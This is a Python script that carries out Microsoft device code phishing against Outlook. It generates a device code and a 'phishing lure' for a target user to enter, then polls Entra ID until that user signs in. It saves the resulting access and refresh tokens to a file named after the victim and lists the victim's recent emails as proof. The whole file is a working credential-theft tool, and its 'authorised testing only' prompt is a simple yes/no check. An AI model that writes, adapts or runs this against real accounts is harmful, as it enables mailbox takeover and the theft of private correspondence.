#!/usr/bin/env python3
"""
device_code_phish_outlook.py – Microsoft device code phishing targeting Outlook API.
Victim consents to mail access; tokens allow reading/deleting emails.
For authorised security testing ONLY.
"""

import requests
import time
import sys
import json

# ---------- Configuration ----------
TENANT_ID = "common"                # or your tenant domain / GUID
CLIENT_ID = "your-client-id"        # App registration ID (with Outlook permissions)
RESOURCE  = "https://outlook.office365.com"   # Target: Outlook REST API
POLL_INTERVAL = 5

# Microsoft Entra ID OAuth2 endpoints
DEVICE_CODE_URL = f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/devicecode"
TOKEN_URL       = f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token"

def get_device_code():
    """Request a device code from Entra ID."""
    data = {
        "client_id": CLIENT_ID,
        "scope": f"{RESOURCE}/.default offline_access"
    }
    resp = requests.post(DEVICE_CODE_URL, data=data)
    resp.raise_for_status()
    return resp.json()

def poll_for_token(device_code):
    """Continuously poll the token endpoint until the user authenticates."""
    data = {
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "client_id": CLIENT_ID,
        "device_code": device_code
    }
    while True:
        resp = requests.post(TOKEN_URL, data=data)
        json_resp = resp.json()
        if resp.status_code == 200:
            print("\n[+] Tokens obtained!")
            return json_resp
        err = json_resp.get("error")
        if err == "authorization_pending":
            print("[*] Waiting for user to complete authentication...")
        elif err == "slow_down":
            print("[!] Polling too fast, slowing down.")
            time.sleep(POLL_INTERVAL + 5)
        elif err in ("expired_token", "authorization_declined"):
            print(f"[-] {err}")
            return None
        else:
            print(f"[!] Unexpected response: {json_resp}")
            return None
        time.sleep(POLL_INTERVAL)

def main():
    print("[*] Requesting device code...")
    try:
        dc = get_device_code()
    except Exception as e:
        print(f"[-] Failed to get device code: {e}")
        sys.exit(1)

    user_code      = dc["user_code"]
    verification_uri = dc["verification_uri"]
    device_code    = dc["device_code"]
    expires_in     = dc.get("expires_in", 900)

    # The phishing lure – customise to your story
    print("\n========== PHISHING LURE ==========")
    print(f"Go to: {verification_uri}")
    print(f"Enter code: {user_code}")
    print(f"Code expires in {expires_in} seconds.")
    print(f"Pre-filled link: {verification_uri}?otc={user_code}")
    print("===================================\n")

    input("Press Enter once you have delivered the code to the test user...")

    tokens = poll_for_token(device_code)
    if tokens:
        # --- Determine user email using Outlook REST API ---
        user_email = "unknown_user"
        try:
            outlook_me = requests.get(
                "https://outlook.office365.com/api/v2.0/me",
                headers={"Authorization": f"Bearer {tokens['access_token']}"}
            )
            me_data = outlook_me.json()
            # The Outlook /me endpoint returns EmailAddress
            upn = me_data.get("EmailAddress")
            if upn:
                safe = "".join(c for c in upn if c.isalnum() or c in "@._-")
                if safe:
                    user_email = safe
        except Exception:
            from datetime import datetime
            user_email = f"unknown_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

        # --- Save tokens to a file named after the user ---
        token_file = f"{user_email}.txt"
        with open(token_file, "w") as f:
            json.dump(tokens, f, indent=2)
        print(f"[+] Full token saved to {token_file}")

        print("[+] Access token (truncated):", tokens["access_token"][:50] + "...")
        if "refresh_token" in tokens:
            print("[+] Refresh token (truncated):", tokens["refresh_token"][:50] + "...")

        # --- Proof of concept: list first 5 emails ---
        print("\n[+] Fetching recent emails (proof)...")
        mail_resp = requests.get(
            "https://outlook.office365.com/api/v2.0/me/messages?$top=5&$select=Subject,From",
            headers={"Authorization": f"Bearer {tokens['access_token']}"}
        )
        if mail_resp.status_code == 200:
            emails = mail_resp.json().get("value", [])
            for i, msg in enumerate(emails, 1):
                sender = msg.get("From", {}).get("EmailAddress", {}).get("Name", "Unknown")
                subject = msg.get("Subject", "(no subject)")
                print(f"  {i}. From: {sender} | Subject: {subject}")
        else:
            print(f"[-] Could not fetch emails: {mail_resp.status_code} {mail_resp.text}")

if __name__ == "__main__":
    print("=" * 60)
    print("WARNING: Authorised testing only. Requires explicit consent.")
    print("=" * 60)
    confirm = input("Do you have authorisation? (yes/no): ").strip().lower()
    if confirm != "yes":
        print("Exiting.")
        sys.exit(0)
    main()